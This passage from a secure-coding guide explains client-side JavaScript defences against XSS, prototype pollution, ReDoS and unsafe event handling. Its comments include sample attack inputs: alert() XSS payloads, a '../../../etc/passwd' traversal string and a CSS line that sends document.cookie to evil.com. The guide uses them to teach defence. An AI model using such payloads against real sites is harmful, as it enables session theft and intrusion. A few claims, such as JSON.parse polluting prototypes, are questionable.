- `element.innerHTML`, `outerHTML`
- `document.write()`, `document.writeln()`
- `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
- `element.setAttribute()` with event handlers
- `location.href`, `location.assign()`, `location.replace()`
- `element.insertAdjacentHTML()`
- `script.src`, `script.text`, `script.textContent`

```javascript
// Vulnerable: source → sink without sanitization
const params = new URLSearchParams(location.search);
const username = params.get('name');
document.getElementById('greeting').innerHTML = `Hello ${username}!`;

// Attack: ?name=<img src=x onerror=alert(document.cookie)>
```

### Safe DOM Manipulation Methods

#### textContent vs innerHTML

`textContent` treats all input as plain text, preventing HTML parsing and script execution. `innerHTML` parses HTML, enabling XSS when used with user input.

```javascript
// Vulnerable
element.innerHTML = userInput;
// Input: <img src=x onerror=alert(1)> executes JavaScript

// Safe
element.textContent = userInput;
// Input: <img src=x onerror=alert(1)> displays as literal text
```

`textContent` is the default choice for displaying user-provided content. Use `innerHTML` only with trusted, sanitized content.

#### createTextNode for Dynamic Content

`document.createTextNode()` explicitly creates text nodes that cannot execute code:

```javascript
const textNode = document.createTextNode(userInput);
element.appendChild(textNode);

// Even malicious input becomes inert text
const malicious = '<script>alert(1)</script>';
const node = document.createTextNode(malicious);
element.appendChild(node);
// Displays: <script>alert(1)</script> as text
```

#### createElement with Property Assignment

Create elements programmatically and set properties rather than parsing HTML strings:

```javascript
// Vulnerable
element.innerHTML = `<a href="${userUrl}">Click here</a>`;

// Safe
const link = document.createElement('a');
link.href = userUrl;  // Browser sanitizes URL
link.textContent = 'Click here';
element.appendChild(link);
```

Property assignment invokes browser-native sanitization. Setting `href` via property normalizes the URL and prevents `javascript:` URLs in modern browsers when combined with proper validation.

### Dangerous JavaScript Patterns

#### eval() and Function Constructor

`eval()` executes arbitrary JavaScript strings. Never use `eval()` with any user-influenced data, even indirectly.

```javascript
// Vulnerable
const userExpression = getUserInput();
const result = eval(userExpression);  // Executes any JavaScript

// Vulnerable - Function constructor is equivalent to eval
const fn = new Function('x', userExpression);
fn(5);
```

**Alternatives**:

- For JSON parsing: Use `JSON.parse()` instead of `eval()`
- For calculations: Build expression parsers or use safe libraries
- For dynamic behavior: Use object maps or strategy patterns

```javascript
// Safe JSON parsing
const data = JSON.parse(jsonString);

// Safe calculation with parser
import mathjs from 'mathjs';
const result = mathjs.evaluate(userExpression, scope);  // Sandboxed
```

#### setTimeout/setInterval with Strings

String arguments to `setTimeout()` and `setInterval()` are evaluated like `eval()`:

```javascript
// Vulnerable
setTimeout(userInput, 1000);  // Executes as JavaScript
setInterval(`doSomething(${userInput})`, 1000);

// Safe - use function references
setTimeout(() => {
  doSomething(userInput);  // userInput is data, not code
}, 1000);
```

Always pass functions, never strings, to timing functions.

#### Event Handler String Assignment

Assigning strings to event handler properties executes them as JavaScript:

```javascript
// Vulnerable
element.setAttribute('onclick', userInput);
element.onclick = new Function(userInput);

// Safe - use addEventListener
element.addEventListener('click', () => {
  handleClick(userInput);  // userInput is data
});
```

Modern event handling via `addEventListener()` separates code from data.

### URL-Based Attacks

#### javascript: Protocol

The `javascript:` pseudo-protocol executes JavaScript when used in URL contexts:

```javascript
// Vulnerable
element.href = userInput;
// Attack: javascript:alert(document.cookie)

// Safe - validate protocol
function isSafeUrl(url) {
  try {
    const parsed = new URL(url, location.origin);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

if (isSafeUrl(userInput)) {
  element.href = userInput;
} else {
  element.href = '#';  // or show error
}
```

Always validate URL protocols before assignment to `href`, `src`, or navigation methods.

#### data: URLs

`data:` URLs embed content directly, enabling XSS through HTML or script content:

```javascript
// Attack vectors
element.src = 'data:text/html,<script>alert(1)</script>';
element.href = 'data:text/html,<body onload=alert(1)>';

// Safe validation
function isSafeUrl(url) {
  try {
    const parsed = new URL(url, location.origin);
    // Only allow specific safe protocols
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}
```

Blocklist `data:`, `javascript:`, `vbscript:`, and `file:` protocols. Allowlist only necessary protocols like `http:`, `https:`, and `mailto:`.

#### Location Manipulation

Directly assigning to `location` properties can execute JavaScript:

```javascript
// Vulnerable
location.href = userInput;
location.assign(userInput);
location.replace(userInput);
location = userInput;

// Attack: javascript:alert(1)

// Safe - validate before navigation
function safeNavigate(url) {
  if (isSafeUrl(url)) {
    location.href = url;
  } else {
    console.error('Invalid URL');
  }
}
```

#### Hash-Based Navigation

URL fragments (`location.hash`) can trigger XSS through unsafe DOM manipulation:

```javascript
// Vulnerable pattern
window.addEventListener('hashchange', () => {
  const section = location.hash.slice(1);
  document.getElementById('content').innerHTML = 
    `<h1>Section: ${section}</h1>`;
});

// Attack: #<img src=x onerror=alert(1)>

// Safe pattern
window.addEventListener('hashchange', () => {
  const section = location.hash.slice(1);
  document.getElementById('content').textContent = section;
});
```

### HTML Sanitization Libraries

#### DOMPurify

DOMPurify is the industry-standard HTML sanitizer, using browser DOM APIs to parse and clean HTML safely:

```javascript
import DOMPurify from 'dompurify';

// Basic sanitization
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;

// Custom configuration
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href'],
  ALLOW_DATA_ATTR: false
});

// Hook for custom processing
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // Force all links to open in new tab
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});
```

DOMPurify handles edge cases like:

- Mutation XSS (mXSS) bypasses
- SVG-based attacks
- XML namespace confusion
- CSS expression injection
- Protocol-based attacks

#### Configuration Options

**ALLOWED_TAGS**: Allowlist of permitted HTML tags. Default is comprehensive but can be restricted:

```javascript
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li']
});
```

**ALLOWED_ATTR**: Permitted attributes. Restrict to prevent event handlers and dangerous attributes:

```javascript
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title']
});
```

**FORBID_TAGS** and **FORBID_ATTR**: Explicitly blocklist tags/attributes:

```javascript
const clean = DOMPurify.sanitize(userInput, {
  FORBID_TAGS: ['style', 'form', 'input'],
  FORBID_ATTR: ['style', 'onerror', 'onload']
});
```

**SAFE_FOR_TEMPLATES**: Prevents template injection by encoding mustache/angular template syntax:

```javascript
const clean = DOMPurify.sanitize(userInput, {
  SAFE_FOR_TEMPLATES: true  // Encodes {{ }}, <% %>, etc.
});
```

#### Return Types

DOMPurify can return different formats:

```javascript
// Default: HTML string
const html = DOMPurify.sanitize(userInput);

// DocumentFragment for direct DOM insertion
const fragment = DOMPurify.sanitize(userInput, {
  RETURN_DOM_FRAGMENT: true
});
element.appendChild(fragment);

// DOM element
const dom = DOMPurify.sanitize(userInput, {
  RETURN_DOM: true
});
```

`RETURN_DOM_FRAGMENT` is most efficient for direct insertion, avoiding serialization overhead.

### Client-Side Validation vs Sanitization

#### Validation: Reject Invalid Input

Validation checks if input matches expected format and rejects non-conforming data:

```javascript
function validateEmail(email) {
  const pattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  if (!pattern.test(email)) {
    throw new Error('Invalid email format');
  }
  return email;
}

function validateAge(age) {
  const num = parseInt(age, 10);
  if (isNaN(num) || num < 0 || num > 150) {
    throw new Error('Invalid age');
  }
  return num;
}
```

Validation is appropriate when input must conform to strict specifications. It provides clear error messages for user correction.

#### Sanitization: Make Input Safe

Sanitization modifies input to remove dangerous content while preserving useful data:

```javascript
function sanitizeFilename(filename) {
  // Remove path separators and dangerous characters
  return filename
    .replace(/[\/\\]/g, '')
    .replace(/\.\./g, '')
    .replace(/[<>:"|?*\x00-\x1f]/g, '')
    .substring(0, 255);
}

function sanitizeUsername(username) {
  // Keep only alphanumeric and safe characters
  return username
    .replace(/[^a-zA-Z0-9_-]/g, '')
    .substring(0, 30);
}
```

Sanitization is appropriate for free-form content where some flexibility is needed. Combined with validation for critical fields.

### Attribute-Based XSS

#### Event Handler Attributes

Event handlers in attributes execute JavaScript:

```javascript
// Vulnerable
element.innerHTML = `<img src="${userUrl}">`;
// Attack: x" onerror="alert(1)

// Safe - use createElement
const img = document.createElement('img');
img.src = userUrl;
element.appendChild(img);
```

Even when HTML context is properly quoted, attackers can inject additional attributes:

```javascript
// Still vulnerable despite quoting
element.innerHTML = `<img src="${escapeQuotes(userUrl)}">`;
// Attack: x" onload="alert(1)" foo="

// Proper fix: avoid innerHTML entirely
```

#### href and src Attribute Injection

Special attributes accept URLs that can execute JavaScript:

```javascript
// Vulnerable
element.innerHTML = `<a href="${userUrl}">Link</a>`;
// Attack: javascript:alert(1)

// Safe with validation
const link = document.createElement('a');
if (isSafeUrl(userUrl)) {
  link.href = userUrl;
  link.textContent = 'Link';
  element.appendChild(link);
}
```

#### style Attribute Injection

CSS in style attributes can exfiltrate data or inject content:

```javascript
// Vulnerable
element.innerHTML = `<div style="${userStyle}">Content</div>`;
// Attack: background:url('http://evil.com/steal?data='+document.cookie)
// Attack: expression(alert(1)) in IE

// Safe - use style object
const div = document.createElement('div');
div.style.color = userColor;  // Browser validates CSS properties
div.textContent = 'Content';
```

Use the `style` object API which validates and sanitizes CSS values. Avoid string-based style assignment.

### Content Security Policy (CSP) Integration

#### unsafe-inline and unsafe-eval

CSP directives restrict inline script and eval usage:

```http
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self';
```

This policy blocks:

- Inline `<script>` tags
- Inline event handlers (`onclick`, etc.)
- `javascript:` URLs
- `eval()`, `Function()`, `setTimeout(string)`

Forcing developers to use external scripts and `addEventListener()` eliminates many DOM-based XSS vectors.

#### Nonce-Based CSP

Nonce-based CSP allows specific inline scripts:

```html
<!-- Server generates cryptographic nonce -->
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'nonce-r4nd0m123'">

<!-- Only scripts with matching nonce execute -->
<script nonce="r4nd0m123">
  // This executes
</script>

<script>
  // This is blocked
</script>
```

Injected scripts cannot include the nonce (which is random per-response), preventing execution even if HTML injection occurs.

#### Strict Dynamic

`strict-dynamic` propagates trust to scripts loaded by trusted scripts:

```http
Content-Security-Policy: 
  script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

Scripts with the nonce can dynamically create additional scripts, but injected HTML cannot. This enables dynamic script loading while maintaining security.

### Framework-Specific Protections

#### React

React escapes content by default in JSX expressions:

```jsx
// Safe - automatically escaped
<div>{userInput}</div>

// Dangerous - bypasses protection
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

**dangerouslySetInnerHTML** requires explicit opt-in and should only be used with sanitized content:

```jsx
import DOMPurify from 'dompurify';

function SafeHTML({ html }) {
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{__html: clean}} />;
}
```

React also protects href attributes from `javascript:` URLs in modern versions, but validation is still recommended.

#### Vue.js

Vue escapes interpolated content:

```vue
<!-- Safe - automatically escaped -->
<div>{{ userInput }}</div>

<!-- Dangerous - raw HTML -->
<div v-html="userInput"></div>
```

**v-html** directive renders raw HTML. Sanitize before use:

```vue
<template>
  <div v-html="sanitizedContent"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.userInput);
    }
  }
}
</script>
```

#### Angular

Angular's template syntax automatically sanitizes values:

```typescript
// Safe - sanitized by Angular
<div>{{ userInput }}</div>
<div [innerHTML]="userInput"></div>  // Also sanitized

// Bypass sanitization (dangerous)
<div [innerHTML]="bypassedContent"></div>
```

To bypass sanitization (use with extreme caution):

```typescript
import { DomSanitizer } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

bypassSecurity(html: string) {
  // Only use with trusted, sanitized content
  return this.sanitizer.bypassSecurityTrustHtml(html);
}
```

Angular's built-in sanitizer is robust, but manual bypass requires external sanitization with DOMPurify.

### PostMessage Security

#### Origin Validation

`postMessage` enables cross-origin communication. Always validate message origin:

```javascript
// Vulnerable - accepts messages from any origin
window.addEventListener('message', (event) => {
  document.getElementById('output').innerHTML = event.data;
});

// Safe - validates origin
window.addEventListener('message', (event) => {
  // Check exact origin
  if (event.origin !== 'https://trusted-domain.com') {
    return;
  }
  
  // Validate message structure
  if (typeof event.data !== 'object' || !event.data.type) {
    return;
  }
  
  // Safe handling
  handleMessage(event.data);
});
```

Never use `startsWith()` or substring matching for origin validation - use exact equality.

#### Message Structure Validation

Validate message structure and types before processing:

```javascript
window.addEventListener('message', (event) => {
  if (event.origin !== TRUSTED_ORIGIN) return;
  
  const { type, payload } = event.data;
  
  // Allowlist message types
  const handlers = {
    'USER_DATA': handleUserData,
    'CONFIG_UPDATE': handleConfig
  };
  
  if (!handlers[type]) {
    console.error('Unknown message type:', type);
    return;
  }
  
  // Validate payload structure
  if (!validatePayload(type, payload)) {
    console.error('Invalid payload for type:', type);
    return;
  }
  
  handlers[type](payload);
});
```

#### Posting Messages Safely

When sending messages, specify target origin explicitly:

```javascript
// Vulnerable - any origin can receive
otherWindow.postMessage(data, '*');

// Safe - specific target
otherWindow.postMessage(data, 'https://trusted-domain.com');
```

Using `*` as target origin exposes data to any iframe or window that might have navigated to a malicious origin.

### Web Storage Security

#### localStorage/sessionStorage XSS

Storage APIs are subject to same-origin policy but vulnerable to XSS. Stored data persists across sessions:

```javascript
// Attacker injects XSS
localStorage.setItem('username', '<img src=x onerror=alert(1)>');

// Later, application reads and renders
const username = localStorage.getItem('username');
element.innerHTML = username;  // XSS executes
```

**Mitigation**:

- Sanitize data retrieved from storage before rendering
- Store structured data as JSON, parse before use
- Never use `innerHTML` with storage data

```javascript
// Safe pattern
const username = localStorage.getItem('username');
element.textContent = username;  // Treats as text

// Or sanitize if HTML is needed
const html = localStorage.getItem('content');
const clean = DOMPurify.sanitize(html);
element.innerHTML = clean;
```

#### Storage Isolation

Storage is isolated by origin (protocol + domain + port). Subdomain isolation prevents storage sharing:

- `app.example.com` cannot access `api.example.com` storage
- `http://example.com` cannot access `https://example.com` storage

Use separate subdomains for untrusted content to prevent storage contamination.

### Regular Expression Denial of Service (ReDoS)

#### Catastrophic Backtracking in JavaScript

JavaScript regex engine can exhibit exponential time complexity with certain patterns:

```javascript
// Vulnerable pattern
const pattern = /^(a+)+$/;
const input = 'a'.repeat(30) + '!';
pattern.test(input);  // Hangs browser

// Safe alternative
const pattern = /^a+$/;
```

Nested quantifiers (`(a+)+`, `(a*)*`, `(a+)*`) cause exponential backtracking when matching fails.

#### Input Length Limits

Limit input length before regex processing:

```javascript
function safeTest(pattern, input, maxLength = 1000) {
  if (input.length > maxLength) {
    throw new Error('Input too long');
  }
  return pattern.test(input);
}
```

#### Timeouts with Web Workers

Use Web Workers to isolate regex execution and implement timeouts:

```javascript
function testWithTimeout(pattern, input, timeout = 1000) {
  return new Promise((resolve, reject) => {
    const worker = new Worker('regex-worker.js');
    
    const timer = setTimeout(() => {
      worker.terminate();
      reject(new Error('Regex timeout'));
    }, timeout);
    
    worker.onmessage = (e) => {
      clearTimeout(timer);
      worker.terminate();
      resolve(e.data);
    };
    
    worker.postMessage({ pattern: pattern.source, input });
  });
}
```

### JSON Handling Security

#### JSON.parse Safely

`JSON.parse()` is safe from code execution but can throw exceptions:

```javascript
// Vulnerable to exceptions
const data = JSON.parse(userInput);

// Safe with error handling
function safeJsonParse(input, fallback = null) {
  try {
    return JSON.parse(input);
  } catch (e) {
    console.error('Invalid JSON:', e);
    return fallback;
  }
}
```

#### Prototype Pollution via JSON

Malicious JSON can pollute object prototypes:

```javascript
const malicious = '{"__proto__": {"isAdmin": true}}';
const obj = JSON.parse(malicious);
// Now ({}).isAdmin === true in some environments

// Mitigation: Object.create(null)
const safe = Object.assign(Object.create(null), JSON.parse(input));
```

Modern JavaScript engines mitigate `__proto__` pollution, but defensively create objects with null prototypes or use `Object.freeze()`:

```javascript
function secureJsonParse(input) {
  const obj = JSON.parse(input);
  delete obj.__proto__;
  delete obj.constructor;
  delete obj.prototype;
  return obj;
}
```

#### JSON Stringify Validation

Stringify user objects before storage to prevent storing functions or special objects:

```javascript
// Unsafe - stores function
localStorage.setItem('config', userConfig);

// Safe - serializes to JSON
localStorage.setItem('config', JSON.stringify(userConfig));
```

### Template Literal Injection

#### Tagged Templates

Untagged template literals can execute code through interpolation:

```javascript
// Vulnerable
const html = `<div>${userInput}</div>`;
element.innerHTML = html;

// Safe with tagged template
function safe(strings, ...values) {
  return strings.reduce((result, str, i) => {
    const value = values[i - 1];
    return result + escape(value) + str;
  });
}

const html = safe`<div>${userInput}</div>`;
element.innerHTML = html;
```

#### HTML Template Tag

Create a reusable HTML escaping template tag:

```javascript
function html(strings, ...values) {
  const escaped = values.map(val => {
    if (val == null) return '';
    return String(val)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  });
  
  return strings.reduce((result, str, i) => {
    return result + str + (escaped[i] || '');
  }, '');
}

// Usage
const safe = html`<div>${userInput}</div>`;
element.innerHTML = safe;
```

### Client-Side Path Traversal

#### File API and Blob URLs

File API paths should never be constructed from user input:

```javascript
// Vulnerable - if filePath comes from user
fetch(`/files/${filePath}`)
  .then(r => r.blob())
  .then(blob => {
    const url = URL.createObjectURL(blob);
    window.open(url);
  });

// Attack: ../../../etc/passwd

// Safe - use indirect references
const fileId = userInput;
const allowedFiles = {
  'doc1': '/files/documents/file1.pdf',
  'doc2': '/files/documents/file2.pdf'
};

const actualPath = allowedFiles[fileId];
if (actualPath) {
  fetch(actualPath).then(/* ... */);
}
```

#### Download Filename Injection

Set download filenames from sanitized user input:

```javascript
// Vulnerable
const filename = userInput;
const url = URL.createObjectURL(blob);
const a = document.createElement('a');
a.href = url;
a.download = filename;  // User controls filename

// Safe - sanitize filename
function sanitizeFilename(name) {
  return name
    .replace(/[^a-zA-Z0-9._-]/g, '_')
    .substring(0, 100);
}

a.download = sanitizeFilename(userInput);
```

### Mutation XSS (mXSS)

Mutation XSS exploits browser HTML parser behavior where sanitized HTML mutates after parsing:

```javascript
// Input appears safe after sanitization
const input = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
const sanitized = DOMPurify.sanitize(input);
// Result: <noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>

element.innerHTML = sanitized;
// Browser parsing causes mutation, img tag becomes active
```

**Mitigation**:

- Use DOMPurify which handles mXSS vectors
- Use `RETURN_DOM` or `RETURN_DOM_FRAGMENT` to avoid serialization round-trips
- Avoid double-parsing HTML

```javascript
// Safe - direct DOM insertion
const fragment = DOMPurify.sanitize(input, {
  RETURN_DOM_FRAGMENT: true
});
element.appendChild(fragment);
```

### Shadow DOM and Web Components

#### Slot Injection

Web component slots can be exploited if user content is projected:

```javascript
// Component template
class MyComponent extends HTMLElement {
  connectedCallback() {
    this.attachShadow({ mode: 'open' });
    this.shadowRoot.innerHTML = `
      <div>
        <slot></slot>
      </div>
    `;
  }
}

// Usage with user content
const component = document.createElement('my-component');
component.innerHTML = userInput;  // Dangerous
document.body.appendChild(component);
```

**Mitigation**: Sanitize content before projection or use shadow DOM's isolation:

```javascript
const component = document.createElement('my-component');
const safe = DOMPurify.sanitize(userInput);
component.innerHTML = safe;
```

#### Closed Shadow Roots

Closed shadow roots prevent external JavaScript access but don't prevent XSS if the component itself processes user input unsafely:

```javascript
this.attachShadow({ mode: 'closed' });
// External code cannot access this.shadowRoot
// But component's own code can still have XSS vulnerabilities
```

Use closed mode for encapsulation, not security. Apply same sanitization practices inside components.

### Trusted Types

Trusted Types is a browser API that enforces type checking for dangerous sinks:

```javascript
// Enable Trusted Types via CSP
// Content-Security-Policy: require-trusted-types-for 'script'

// This will throw without Trusted Types
element.innerHTML = userInput;  // Error: assignment to innerHTML requires TrustedHTML

// Create policy
const policy = trustedTypes.createPolicy('default', {
  createHTML: (input) => {
    return DOMPurify.sanitize(input);
  }
});

// Use policy to create Trusted Type
const trustedHtml = policy.createHTML(userInput);
element.innerHTML = trustedHtml;  // Works with TrustedHTML
```

Trusted Types enforces that dangerous sinks only accept typed objects created through policies, preventing accidental unsafe assignments.

#### Trusted Types Policies

Define policies for different contexts:

```javascript
const htmlPolicy = trustedTypes.createPolicy('html', {
  createHTML: (input) => DOMPurify.sanitize(input)
});

const urlPolicy = trustedTypes.createPolicy('url', {
  createScriptURL: (input) => {
    const url = new URL(input, location.origin);
    if (url.origin === location.origin) {
      return url.href;
    }
    throw new TypeError('Invalid script URL');
  }
});

// Usage
element.innerHTML = htmlPolicy.createHTML(userInput);
script.src = urlPolicy.createScriptURL('/scripts/app.js');
```

Default policy handles fallback cases:

```javascript
trustedTypes.createPolicy('default', {
  createHTML: (s) => {
    console.warn('Implicit HTML creation:', s);
    return DOMPurify.sanitize(s);
  },
  createScriptURL: (s) => {
    console.warn('Implicit script URL:', s);
    if (s.startsWith('/')) return s;
    throw new TypeError('Invalid URL');
  }
});
```

### Client-Side Prototype Pollution

Unsafe property assignment can pollute Object.prototype:

```javascript
// Vulnerable
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];
  }
}

const userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, userInput);
// Now: ({}).isAdmin === true
```

**Mitigation strategies**:

```javascript
// Check hasOwnProperty
function safeMerge(target, source) {
  for (let key in source) {
    if (source.hasOwnProperty(key) && key !== '__proto__' && key !== 'constructor') {
      target[key] = source[key];
    }
  }
}

// Use Map instead of objects
const config = new Map();
for (let [key, value] of Object.entries(userInput)) {
  config.set(key, value);
}

// Object.create(null) - no prototype
const obj = Object.assign(Object.create(null), userInput);

// Freeze prototypes
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
```

### Defense in Depth for Client-Side Security

#### Layered Protection

Implement multiple defensive layers:

1. **Input Validation**: Reject malformed data at entry
2. **Output Encoding**: Escape data at use point
3. **CSP**: Browser-level script restriction
4. **Trusted Types**: Type enforcement for sinks
5. **Sanitization**: Clean complex content (HTML)
6. **Framework Protection**: Leverage built-in security

```javascript
// Layer 1: Validation
if (!isValidFormat(userInput)) {
  throw new Error('Invalid input');
}

// Layer 2: Sanitization (for HTML content)
const clean = DOMPurify.sanitize(userInput);

// Layer 3: Trusted Types
const trusted = policy.createHTML(clean);

// Layer 4: Safe assignment
element.innerHTML = trusted;

// Layer 5: CSP blocks any bypassed scripts
```

#### Security Principles

**Principle of Least Privilege**: Grant minimum necessary permissions. Use read-only properties where possible:

```javascript
Object.defineProperty(obj, 'config', {
  value: config,
  writable: false,
  configurable: false
});
```

**Fail Secure**: On validation failure, deny access rather than attempting to fix:

```
// Bad — tries to fix
function processUrl(url) {
    if (url.includes('javascript:')) {
        url = url.replace('javascript:', ''); // Insufficient
    }
    return url;
}

// Good — rejects
function processUrl(url) {
    if (!isSafeUrl(url)) {
        throw new Error('Invalid URL');
    }
    return url;
}
```

**Defense in Depth**: Multiple independent security layers ensure single-point failures don't compromise security entirely.

---

## Safe Event Handling

### Race Conditions in Event Handlers

Race conditions occur when multiple event handlers access shared state simultaneously without proper coordination. The execution order becomes non-deterministic, leading to inconsistent state updates.

**Critical scenarios:**

- Rapid successive clicks triggering multiple async operations
- Concurrent form submissions before validation completes
- Multiple handlers modifying the same DOM element
- Parallel state updates in frameworks like React

**Mitigation strategies:**

- Disable interactive elements during async operations
- Implement debouncing/throttling for high-frequency events
- Use atomic state updates or transaction-like patterns
- Employ locks or semaphores for critical sections
- Leverage framework-specific state management (Redux, Zustand) with serialized updates

### Memory Leaks from Event Listeners

Unremoved event listeners prevent garbage collection of associated objects, causing memory accumulation over time.

**Common leak patterns:**

```javascript
// Leaked reference
element.addEventListener('click', () => {
  heavyObject.process(); // heavyObject cannot be GC'd
});

// Anonymous function cannot be removed
button.addEventListener('click', function() { });
// Later: button.removeEventListener('click', ???); // No reference
```

**Prevention techniques:**

- Store handler references for explicit removal
- Use `AbortController` for automatic cleanup
- Implement cleanup in component unmount/destroy hooks
- Prefer weak references where appropriate
- Use event delegation to minimize listener count

### Event Delegation Security

Event delegation attaches listeners to parent elements, but introduces security considerations:

**Risks:**

- **Event hijacking**: Malicious child elements triggering unintended handlers
- **XSS vulnerabilities**: Injected elements capturing sensitive events
- **Click-jacking**: Transparent overlays intercepting legitimate interactions

**Safeguards:**

- Validate `event.target` against expected elements
- Use strict selector matching in delegated handlers
- Implement Content Security Policy (CSP)
- Sanitize dynamic content before insertion
- Check `event.isTrusted` to filter synthetic events

### Input Validation and Sanitization

Event handlers receiving user input must validate and sanitize to prevent injection attacks and data corruption.

**Validation layers:**

1. **Client-side validation**: Immediate feedback, not security boundary
2. **Event handler validation**: Type checking, range validation
3. **Server-side validation**: Authoritative security layer

**Sanitization approaches:**

- Escape HTML entities before DOM insertion
- Use `textContent` instead of `innerHTML` when possible
- Validate input format (regex, schema validation)
- Implement allowlists over blocklists
- Encode data appropriate to context (HTML, URL, JavaScript)

### Preventing Event Handler Injection

Dynamic event handler creation from untrusted sources enables arbitrary code execution.

**Vulnerable patterns:**

```javascript
// DANGEROUS: eval-like behavior
element.setAttribute('onclick', userInput);
element.onclick = new Function(userInput);
```

**Safe alternatives:**

- Never construct handlers from user input
- Use data attributes with predefined handler mapping
- Implement command pattern with validated action names
- Employ CSP `unsafe-inline` restrictions
- Use framework templating with automatic escaping

### Error Boundary Implementation

Uncaught errors in event handlers can crash applications or expose sensitive information.

**Error handling strategies:**

**Synchronous handlers:**

```javascript
element.addEventListener('click', (e) => {
  try {
    riskyOperation();
  } catch (error) {
    logError(error);
    displayUserFriendlyMessage();
    // Prevent default if appropriate
  }
});
```

**Async handlers:**

```javascript
element.addEventListener('click', async (e) => {
  try {
    await asyncOperation();
  } catch (error) {
    // Handle rejection
  }
});
```

**Global safety nets:**

- `window.addEventListener('error')` for uncaught exceptions
- `window.addEventListener('unhandledrejection')` for unhandled promises
- Framework-level error boundaries (React, Vue)
- Centralized error logging and monitoring

### Throttling and Debouncing

High-frequency events (scroll, resize, mousemove) can overwhelm handlers, causing performance degradation.

**Throttling**: Executes handler at most once per time interval

```javascript
function throttle(func, delay) {
  let lastCall = 0;
  return function(...args) {
    const now = Date.now();
    if (now - lastCall >= delay) {
      lastCall = now;
      func.apply(this, args);
    }
  };
}
```

**Debouncing**: Delays execution until events stop for specified duration

```javascript
function debounce(func, delay) {
  let timeoutId;
  return function(...args) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => func.apply(this, args), delay);
  };
}
```

**Selection criteria:**

- Throttle: Animation frames, progress tracking, analytics
- Debounce: Search autocomplete, form validation, window resize

### Event Capture vs Bubbling

Understanding event propagation prevents unintended handler execution and enables strategic listener placement.

**Phases:**

1. **Capture phase**: Event travels from window to target (top-down)
2. **Target phase**: Event reaches target element
3. **Bubble phase**: Event travels from target to window (bottom-up)

**Capture phase usage:**

```javascript
element.addEventListener('click', handler, { capture: true });
```

**Strategic applications:**

- Capture: Early intervention, global monitoring, security checks
- Bubble: Default behavior, event delegation, component encapsulation

**stopPropagation considerations:**

- Prevents further propagation in current phase
- May break event delegation patterns
- Can hide events from analytics or monitoring
- Use `stopImmediatePropagation()` to prevent same-element handlers

### Passive Event Listeners

Passive listeners improve scroll performance by preventing `preventDefault()` calls.

```javascript
element.addEventListener('touchstart', handler, { passive: true });
```

**Benefits:**

- Browser can optimize scrolling without waiting for handler
- Eliminates scroll jank on touch devices
- Automatic in modern browsers for `touchstart`, `touchmove`

**Limitations:**

- Cannot call `preventDefault()`
- Console warnings if attempted
- Not suitable for handlers requiring default prevention

### Custom Event Security

Custom events enable component communication but require validation to prevent abuse.

**Secure custom event pattern:**

```javascript
// Dispatch with validation
const validTypes = ['userAction', 'dataUpdate'];
function dispatchSecureEvent(type, detail) {
  if (!validTypes.includes(type)) {
    throw new Error('Invalid event type');
  }
  // Sanitize detail object
  const sanitized = sanitizeEventDetail(detail);
  element.dispatchEvent(new CustomEvent(type, { 
    detail: sanitized,
    bubbles: false, // Limit scope
    composed: false
  }));
}

// Listen with validation
element.addEventListener('userAction', (e) => {
  if (!e.isTrusted) return; // [Inference] May filter legitimate programmatic events
  validateEventDetail(e.detail);
  handleAction(e.detail);
});
```

### Once Option for Single-Use Handlers

The `once` option automatically removes listeners after first execution, preventing memory leaks and redundant processing.

```javascript
element.addEventListener('click', handler, { once: true });
```

**Use cases:**

- Initialization events
- One-time user interactions (splash screens, tutorials)
- Resource loading callbacks
- Modal dismiss handlers

### Signal-Based Cleanup

`AbortController` provides centralized cleanup for multiple event listeners.

```javascript
const controller = new AbortController();
const signal = controller.signal;

element1.addEventListener('click', handler1, { signal });
element2.addEventListener('mouseover', handler2, { signal });
document.addEventListener('keydown', handler3, { signal });

// Remove all listeners at once
controller.abort();
```

**Advantages:**

- Single cleanup call for multiple listeners
- Integration with fetch API and other abortable operations
- Prevents cleanup logic duplication
- Framework-agnostic pattern

### Trusted Events vs Synthetic Events

Browsers mark user-initiated events as trusted (`isTrusted: true`). Programmatically created events have `isTrusted: false`.

**Security implications:**

```javascript
element.addEventListener('click', (e) => {
  if (!e.isTrusted) {
    console.warn('Synthetic event detected');
    return; // Reject automated clicks
  }
  performSensitiveAction();
});
```

**Scenarios requiring trust validation:**

- Payment processing
- Account deletion
- Permission grants
- Security-sensitive state changes

**[Inference]** Some legitimate automation tools may trigger non-trusted events, potentially blocking valid use cases.

### Event Handler Context Binding

Incorrect `this` binding causes runtime errors or unintended behavior in event handlers.

**Context preservation methods:**

**Arrow functions:**

```javascript
class Component {
  constructor() {
    this.state = {};
    // Arrow function preserves this
